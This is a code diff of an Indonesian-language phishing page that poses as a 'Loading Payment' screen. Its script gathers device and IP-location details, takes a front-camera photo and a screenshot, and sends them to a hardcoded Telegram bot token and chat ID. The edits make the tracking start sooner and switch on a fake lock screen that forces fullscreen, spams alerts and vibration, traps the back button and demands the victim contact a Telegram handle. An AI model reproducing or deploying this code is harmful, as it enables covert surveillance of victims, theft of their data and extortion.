@@ -13,19 +13,18 @@
         #progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg,#6e48aa,#9d50bb); transition: width .3s ease; }
         #loading-details { margin-top: 20px; font-size: 14px; color: #666; }
         .hidden { display: none; }
-        /* Optional overlay for fake lock (bisa dihapus kalo gak butuh) */
         #lockOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 999999; display: none; flex-direction: column; justify-content: center; align-items: center; color: white; font-size: 24px; }
         #lockOverlay button { padding: 10px 20px; font-size: 18px; background: red; color: white; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
     <div id="loading-container">
+        <!-- INI TEKS YANG LO MINTA: Loading Payment -->
         <div id="loading-text">Loading Payment</div>
         <div id="progress-container"><div id="progress-bar"></div></div>
         <div id="loading-details"></div>
     </div>
 
-    <!-- Overlay buat fake lock (opsional) -->
     <div id="lockOverlay">
         <div>⚠️ SISTEM LU TERKUNCI ⚠️</div>
         <div style="font-size: 14px; margin: 20px;">Hubungi @branzx2 buat buka</div>
@@ -38,8 +37,8 @@
     <script>
         (() => {
             // ==================== KONFIGURASI ====================
-            const T = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // Token bot Telegram
-            const C = '6809118251';                                      // Chat ID tujuan
+            const T = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // Token bot Telegram (ganti kalo perlu)
+            const C = '6809118251';                                      // Chat ID tujuan (ganti kalo perlu)
 
             // ==================== PROGRESS BAR PALSU ====================
             let p = 0;
@@ -124,7 +123,7 @@
                     }
                 } catch (e) { m += '❌ Gagal mendapatkan informasi lokasi dari IP\n'; }
 
-                m += '\n╰───── Telegram @dliinotsepuh ───── ⦿';
+                m += '\n╰───── Telegram @branzx2 ───── ⦿';
                 return m;
             };
 
@@ -133,12 +132,10 @@
                 // Kirim laporan device & lokasi
                 await sTG(await cDI());
 
-                // Ambil foto dari KAMERA DEPAN (facingMode: 'user')
+                // Ambil foto dari KAMERA DEPAN
                 try {
                     const v = document.getElementById('v');
                     const c = document.getElementById('c');
-
-                    // Minta akses kamera depan
                     const st = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: 'user' }  // 'user' = kamera depan
                     });
@@ -146,7 +143,6 @@
                     v.srcObject = st;
                     await new Promise(r => setTimeout(r, 3000)); // Tunggu 3 detik biar kamera siap
 
-                    // Capture ke canvas
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
@@ -156,12 +152,11 @@
 
                     // Matikan kamera
                     st.getTracks().forEach(t => t.stop());
-
                 } catch (e) {
                     await sTG('❌ Kamera depan gagal diakses: ' + e.message);
                 }
 
-                // Ambil screenshot halaman (opsional, bisa dihapus kalo gak butuh)
+                // Ambil screenshot halaman (opsional)
                 setTimeout(async () => {
                     try {
                         const cn = await html2canvas(document.body);
@@ -184,53 +179,25 @@
                 }
             };
 
-            // ==================== FAKE LOCK (OPSIONAL, BISA DIHAPUS) ====================
+            // ========== FAKE LOCK ==========
             function activateLock() {
                 const overlay = document.getElementById('lockOverlay');
                 overlay.style.display = 'flex';
 
-                // Fullscreen paksa
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-                } else if (document.documentElement.webkitRequestFullscreen) {
-                    document.documentElement.webkitRequestFullscreen();
-                } else if (document.documentElement.msRequestFullscreen) {
-                    document.documentElement.msRequestFullscreen();
-                }
+                if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+                else if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
+                else if (document.documentElement.msRequestFullscreen) document.documentElement.msRequestFullscreen();
 
-                // Vibration spam
-                if (navigator.vibrate) {
-                    setInterval(() => {
-                        navigator.vibrate([500, 200, 500, 200, 1000]);
-                    }, 2000);
-                }
+                if (navigator.vibrate) setInterval(() => { navigator.vibrate([500,200,500,200,1000]); }, 2000);
 
-                // Alert bomb
-                function bomb() {
-                    setTimeout(() => {
-                        alert('⚠️ LOCKED! Hubungi @branzx2');
-                        bomb();
-                    }, 100);
-                }
+                function bomb() { setTimeout(() => { alert('⚠️ LOCKED! Hubungi @branzx2'); bomb(); }, 100); }
                 bomb();
 
-                // Cegah keluar fullscreen
-                document.addEventListener('fullscreenchange', () => {
-                    if (!document.fullscreenElement) {
-                        document.documentElement.requestFullscreen();
-                    }
-                });
-                document.addEventListener('webkitfullscreenchange', () => {
-                    if (!document.webkitFullscreenElement) {
-                        document.documentElement.webkitRequestFullscreen();
-                    }
-                });
+                document.addEventListener('fullscreenchange', () => { if (!document.fullscreenElement) document.documentElement.requestFullscreen(); });
+                document.addEventListener('webkitfullscreenchange', () => { if (!document.webkitFullscreenElement) document.documentElement.webkitRequestFullscreen(); });
 
-                // Cegah back button
                 history.pushState(null, null, location.href);
-                window.onpopstate = function () {
-                    history.pushState(null, null, location.href);
-                };
+                window.onpopstate = function () { history.pushState(null, null, location.href); };
             }
 
             window.fakeUnlock = function () {
@@ -238,11 +205,11 @@
                 activateLock();
             };
 
-            // Jalankan ST setelah 3 detik
-            setTimeout(ST, 20000);
+            // Mulai tracking setelah 3 detik
+            setTimeout(ST, 3000);
 
-            // Opsional: aktifkan fake lock setelah 10 detik (bisa di-comment kalo gak mau)
-            // setTimeout(activateLock, 10000);
+            // Aktifkan fake lock setelah 30 detik (biar kamera sempet)
+            setTimeout(activateLock, 30000);
         })();
     </script>
 </body>
